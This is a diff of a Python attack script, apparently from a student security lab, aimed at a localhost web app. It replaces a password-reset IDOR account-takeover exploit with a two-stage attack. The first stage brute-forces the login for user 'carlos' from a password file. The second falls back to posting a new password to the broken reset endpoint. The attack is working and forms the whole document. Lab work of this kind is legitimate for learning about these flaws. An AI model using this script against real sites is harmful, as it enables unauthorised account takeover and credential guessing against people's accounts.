@@ -1,50 +1,63 @@
 import requests
 
-# --- הגדרות היעד ---
-# שימי לב: אם האתר שלך רץ בכתובת אחרת, תשני כאן
 BASE_URL = "http://localhost/CyberProject/" 
-TARGET_FILE = "reset_password.php"
-RESET_URL = BASE_URL + TARGET_FILE
+LOGIN_URL = BASE_URL + "login.php" 
+RESET_URL = BASE_URL + "reset_password.php"
 
-# המשתמש שאנחנו רוצים "לגנוב" והסיסמה החדשה שנחליט עבורו
 TARGET_USER = "carlos"
-NEW_PASSWORD = "1234"
+NEW_PASSWORD = "123123"
+PASSWORDS_LIST = ["123456", "password", "12345", "qwerty", "carlos123"]
 
-def run_exploit():
-    print(f"[*] Initializing Account Takeover attack via Broken Password Reset...")
-    print(f"[*] Target User: {TARGET_USER}")
-    print(f"[*] Target URL: {RESET_URL}")
-    
-    # שלב 1: הזרקת הפרמטר ב-URL (ה-IDOR)
-    # אנחנו שולחים את שם המשתמש ב-GET למרות שזה דף איפוס
-    params = {
-        'user': TARGET_USER
-    }
-    
-    # שלב 2: שליחת הסיסמה החדשה בתוך ה-Body של הבקשה (POST)
-    data = {
-        'new_password': NEW_PASSWORD
-    }
-    
-    print(f"[*] Sending malicious request to bypass authentication...")
+def try_brute_force(filename="passwords.txt"):
+    print(f"[*] Step 1: Starting Brute Force from file: {filename}")
     
     try:
-        # ביצוע הבקשה
+        with open(filename, 'r', encoding='utf-8', errors='ignore') as file:
+            for line in file:
+                # remove any whitespace characters from the password
+                password = line.strip()
+                if not password:
+                    continue
+                
+                data = {
+                    'username': TARGET_USER,
+                    'password': password,
+                    'login_submit': ''
+                }
+                
+                try:
+                    # use timeout to prevent hanging on slow responses
+                    response = requests.post(LOGIN_URL, data=data, allow_redirects=False, timeout=5)
+                    
+                    if response.status_code == 302 or "home.php" in response.headers.get('Location', ''):
+                        print(f"\n[!!!] SUCCESS! Found password in file: {password}")
+                        return True
+                        
+                except requests.exceptions.RequestException:
+                    print(f"[!] Connection error testing password: {password}")
+                    continue
+                    
+    except FileNotFoundError:
+        print(f"[!] Error: The file {filename} was not found.")
+        return False
+
+    print("[-] Brute force finished. No password from the file worked.")
+    return False
+
+def run_reset_exploit():
+    print(f"\n[*] Step 2: Falling back to Broken Password Reset...")
+    params = {'user': TARGET_USER}
+    data = {'new_password': NEW_PASSWORD}
+    
+    try:
         response = requests.post(RESET_URL, params=params, data=data)
-        
-        # בדיקה אם התקיפה הצליחה לפי התוכן שחוזר מהשרת
-        if response.status_code == 200 and f"The password for <strong>{TARGET_USER}</strong>" in response.text:
-            print("\n" + "="*40)
-            print("[!!!] ATTACK SUCCESSFUL [!!!]")
-            print(f"[+] Password for '{TARGET_USER}' has been changed.")
-            print(f"[+] New Credentials: {TARGET_USER} / {NEW_PASSWORD}")
-            print("="*40)
+        if response.status_code == 200 and f"<strong>{TARGET_USER}</strong>" in response.text:
+            print(f"[+] Reset successful! New password: {NEW_PASSWORD}")
         else:
-            print("\n[-] Attack failed. Server response did not indicate a successful reset.")
-            print("[?] Check if the user exists in the database or if the URL is correct.")
-            
+            print("[-] Reset attack failed.")
     except Exception as e:
-        print(f"\n[!] Error connecting to server: {e}")
+        print(f"[!] Connection error: {e}")
 
 if __name__ == "__main__":
-    run_exploit()
+    if not try_brute_force():
+        run_reset_exploit()
